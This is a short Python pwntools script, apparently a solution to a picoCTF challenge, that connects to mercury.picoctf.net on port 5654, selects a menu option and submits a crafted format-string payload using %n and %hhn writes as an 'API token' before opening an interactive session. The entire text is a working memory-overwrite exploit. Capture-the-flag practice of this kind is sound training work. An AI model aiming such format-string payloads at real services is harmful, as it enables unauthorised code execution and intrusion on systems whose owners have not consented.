from pwn import *

context(log_level="debug", arch="amd64", os="linux")
r = remote("mercury.picoctf.net", 5654)
r.recvuntil(b"2) View my portfolio\n")
r.sendline(b"1")
r.recvuntil(b"What is your API token?\n")
payload = b"%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%18$n"
r.sendline(payload)
r.interactive()